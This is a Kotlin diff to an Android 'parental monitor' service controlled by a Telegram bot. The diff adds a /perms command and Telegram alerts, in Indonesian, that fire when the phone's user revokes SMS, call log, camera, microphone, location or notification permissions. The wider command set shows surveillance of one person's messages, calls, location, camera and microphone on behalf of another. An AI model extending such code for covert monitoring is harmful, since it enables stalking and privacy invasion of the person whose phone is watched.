@@ -137,7 +137,7 @@ class MonitoringService : Service() {
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval")
         private val NO_REPLAY_COMMANDS = setOf("/sms", "/smsconfirm", "/ring", "/record", "/recordvideo", "/lock")
-        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
+        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val MUTATING_MAX_AGE_SEC = 300L
         private const val PING_RATE_WINDOW_MS = 120_000L
@@ -1236,6 +1236,7 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.BotCommand("pause", "Pause photos for N minutes"),
             com.redeye.parentalmonitor.network.BotCommand("battery", "Show battery level"),
             com.redeye.parentalmonitor.network.BotCommand("status", "Show monitoring status"),
+            com.redeye.parentalmonitor.network.BotCommand("perms", "Show app permissions"),
             com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
             com.redeye.parentalmonitor.network.BotCommand("resume", "Resume monitoring"),
             com.redeye.parentalmonitor.network.BotCommand("notif", "Notif forwarding: /notif on|off|status"),
@@ -1424,6 +1425,10 @@ class MonitoringService : Service() {
                         appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
                     }
                 )
+            }
+            "/perms" -> {
+                val notifOn = try { preferencesManager.notifForwardEnabled } catch (_: Exception) { false }
+                sendToTelegram(permInventoryText(permissionRawStates(), notifOn))
             }
             "/lastcalls" -> {
                 val calls = callLogRepository.getAllCalls(5)
@@ -1986,6 +1991,7 @@ class MonitoringService : Service() {
                         appendLine("/pause \u003cminutes\u003e - pause photos")
                         appendLine("/battery - show battery level")
                         appendLine("/status - show monitoring status")
+                        appendLine("/perms - show app permissions")
                         appendLine("/stop - pause monitoring")
                         appendLine("/resume - resume monitoring")
                         appendLine("/notif <on|off|status> - notif forwarding")
@@ -3636,24 +3642,88 @@ class MonitoringService : Service() {
     private suspend fun checkPermissionHealth() {
         try {
             if (!preferencesManager.isConfigured()) return
-            val missing = ArrayList<String>()
-            if (!hasSmsPermission()) missing.add("baca SMS")
-            if (!hasCallLogPermission()) missing.add("log panggilan")
-            if (!hasContactsPermission()) missing.add("kontak")
-            if (!hasSendSmsPermission()) missing.add("kirim SMS")
-            if (!hasCameraPermission()) missing.add("kamera")
-            if (!hasMicPermission()) missing.add("mikrofon")
-            if (!hasLocationPermission()) missing.add("lokasi")
-            else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q && !hasBackgroundLocation()) missing.add("lokasi latar")
-            if (preferencesManager.notifForwardEnabled && !isNotifForwarding()) missing.add("akses notifikasi")
-            if (!isBatteryExempt()) missing.add("baterai tanpa batas")
+            val notifEnabled = try { preferencesManager.notifForwardEnabled } catch (_: Exception) { false }
+            val raw = permissionRawStates()
+            val stored = try { preferencesManager.permSnapshot } catch (_: Exception) { -1 }
+            val cur = permissionMask(raw, notifEnabled, stored)
+            if (stored == -1) {
+                try { preferencesManager.setPermSnapshotSync(cur) } catch (_: Exception) { }
+                sendToTelegram(permInventoryText(raw, notifEnabled))
+                return
+            }
+            val lost = ArrayList<String>()
+            val regained = ArrayList<String>()
+            for (i in raw.indices) {
+                val was = (stored and (1 shl i)) != 0
+                val now = (cur and (1 shl i)) != 0
+                if (was && !now) lost.add(permLabels[i].lowercase(java.util.Locale.ROOT))
+                else if (!was && now) regained.add(permLabels[i].lowercase(java.util.Locale.ROOT))
+            }
+            if (lost.isNotEmpty() || regained.isNotEmpty()) {
+                try { preferencesManager.setPermSnapshotSync(cur) } catch (_: Exception) { }
+                val locLabel = permLabels[6].lowercase(java.util.Locale.ROOT)
+                val bgLabel = permLabels[7].lowercase(java.util.Locale.ROOT)
+                val lostShown = if (lost.contains(locLabel)) lost.filter { it != bgLabel } else lost
+                if (lostShown.isNotEmpty()) sendToTelegram("⚠️ Izin hilang: " + lostShown.joinToString(", ") + ". Monitoring buta sebagian — buka Setup di perangkat dan berikan lagi.")
+                if (regained.isNotEmpty()) sendToTelegram("✅ Izin kembali: " + regained.joinToString(", ") + ".")
+                return
+            }
+            val missing = missingPermLabels(cur)
             if (missing.isEmpty()) return
-            val now = System.currentTimeMillis()
+            val nowMs = System.currentTimeMillis()
             val last = try { preferencesManager.permHealthAlertAt } catch (_: Exception) { 0L }
-            if (now - last < 24 * 60 * 60_000L) return
-            try { preferencesManager.setPermHealthAlertAtSync(now) } catch (_: Exception) { }
+            if (nowMs - last < 24 * 60 * 60_000L) return
+            try { preferencesManager.setPermHealthAlertAtSync(nowMs) } catch (_: Exception) { }
             sendToTelegram("⚠️ Izin dicabut: " + missing.joinToString(", ") + ". Monitoring buta sebagian — buka Setup di perangkat dan berikan lagi.")
         } catch (_: Exception) {
+        }
+    }
+
+    private val permLabels = arrayOf("Baca SMS", "Log panggilan", "Kontak", "Kirim SMS", "Kamera", "Mikrofon", "Lokasi", "Lokasi latar", "Akses notifikasi", "Baterai tanpa batas")
+
+    private fun permissionRawStates(): BooleanArray {
+        val notifEnabled = try { preferencesManager.notifForwardEnabled } catch (_: Exception) { false }
+        return booleanArrayOf(
+            hasSmsPermission(),
+            hasCallLogPermission(),
+            hasContactsPermission(),
+            hasSendSmsPermission(),
+            hasCameraPermission(),
+            hasMicPermission(),
+            hasLocationPermission(),
+            hasBackgroundLocation(),
+            !notifEnabled || isNotifForwarding(),
+            isBatteryExempt()
+        )
+    }
+
+    private fun permissionMask(raw: BooleanArray, notifEnabled: Boolean, stored: Int): Int {
+        var mask = 0
+        for (i in raw.indices) {
+            var g = raw[i]
+            if (i == 7 && !raw[6]) g = if (stored == -1) true else (stored and (1 shl 7)) != 0
+            if (i == 8 && !notifEnabled) g = if (stored == -1) true else (stored and (1 shl 8)) != 0
+            if (g) mask = mask or (1 shl i)
+        }
+        return mask
+    }
+
+    private fun missingPermLabels(mask: Int): ArrayList<String> {
+        val out = ArrayList<String>()
+        for (i in arrayOf(0, 1, 2, 3, 4, 5, 8, 9)) if ((mask and (1 shl i)) == 0) out.add(permLabels[i].lowercase(java.util.Locale.ROOT))
+        if ((mask and (1 shl 6)) == 0) out.add(permLabels[6].lowercase(java.util.Locale.ROOT))
+        else if ((mask and (1 shl 7)) == 0) out.add(permLabels[7].lowercase(java.util.Locale.ROOT))
+        return out
+    }
+
+    private fun permInventoryText(raw: BooleanArray, notifEnabled: Boolean): String {
+        return buildString {
+            appendLine("🛡️ <b>Izin</b>")
+            for (i in raw.indices) {
+                appendLine("${if (raw[i]) "✅" else "❌"} ${permLabels[i]}")
+            }
+            if (!notifEnabled) appendLine("Penerusan notif dimatikan (/notif off).")
+            appendLine("Cabut/pasang ulang? Buka Setup di perangkat.")
         }
     }
 
